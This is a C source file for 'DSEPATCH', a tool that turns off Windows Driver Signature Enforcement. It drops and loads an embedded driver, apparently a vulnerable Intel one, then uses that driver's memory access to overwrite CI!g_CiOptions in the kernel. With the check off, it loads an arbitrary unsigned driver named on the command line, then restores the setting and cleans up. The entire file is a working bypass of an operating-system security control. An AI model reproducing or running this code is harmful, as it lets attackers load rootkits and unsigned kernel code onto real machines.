/*!
 * DSEPATCH (c) Driver Signing Enforcement 
 * Patcher for anything from Windows 8 to
 * present.
!*/
#define _GNU_SOURCE
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include "util.h"
#include "ci.h"
#include "intel.h"
#include "service.h"


int main(int argc, char **argv)
{ 
  if ( argc < 2 ) 
  {
	  printf("usage: %s [driver.sys]\n", argv[0]);
	  return 1;
  };

  BOOL  DriverLoaded;
  CHAR *szDriverPath;
  CHAR  szTemporaryFolder[MAX_PATH + 1];
  RtlSecureZeroMemory(&szTemporaryFolder, MAX_PATH + 1);
  if ( GetTempPathA(MAX_PATH, (PCHAR)&szTemporaryFolder) != 0 )
  {
    asprintf
    (
     	&szDriverPath, "%s%s.%s", 
	&szTemporaryFolder, 
	RandomString(5), 
	"sys"
    ); DumpToFile(szDriverPath);

    if ( (DriverLoaded = LoadDriver(szDriverPath)) ) {
      ULONG32 Ci_gOptions_n = 0x1;
      ULONG32 Ci_gOptions_o = 0;
      LPVOID  Ci_MemoryBase = 0;
      LPVOID  Ci_PtrOptions = 0;
      HANDLE  IntelHandle   = 0;

      printf("[+] %s loaded successfully\n", szDriverPath);

      Ci_MemoryBase = GetDrvBase("CI.dll");
      printf("[+] CI.DLL @ %p\n", Ci_MemoryBase);

      Ci_PtrOptions = GetCiOptions1(Ci_MemoryBase);
      printf("[+] CI!g_CiOptions @ %p\n", Ci_PtrOptions);

      if ( (IntelHandle = GetHandle()) != NULL )
      {
	      printf("[+] IntelHandle @ %p\n", IntelHandle);

	      MemCpy(IntelHandle, &Ci_gOptions_o, Ci_PtrOptions, 4);
	      printf("[+] CI!g_Options = 0x%x\n", Ci_gOptions_o);

	      MemCpy(IntelHandle, Ci_PtrOptions, &Ci_gOptions_n, 4);
	      printf("[+] wrote 0x1 @ CI!g_CiOptions\n");
	      printf("[+] loading %s into kernel memory\n", argv[1]);

	      if ( LoadDriver(argv[1]) ) {
		      printf("[+] %s loaded successfully\n", argv[1]);
	      } else {
		      printf("[-] %s failed to load 0x%x\n", argv[1],
				      GetLastError());
	      };

	      printf("[*] reseting CI!g_CiOptions to 0x%x\n", Ci_gOptions_o);
	      MemCpy(IntelHandle, Ci_PtrOptions, &Ci_gOptions_o, 4);
	      printf("[+] wrote 0x%x @ CI!g_CiOptions\n", Ci_gOptions_o);
	      printf("[+] Happy kernel hacking ! :)\n");
	      CloseHandle(IntelHandle);
      };
    } else { printf("[ ] LoadDriver 0x%x\n", GetLastError()); };
  };

Cleanup:
  if ( DriverLoaded ) 
	  UnloadDriver(szDriverPath);

  DeleteFileA(szDriverPath);
};
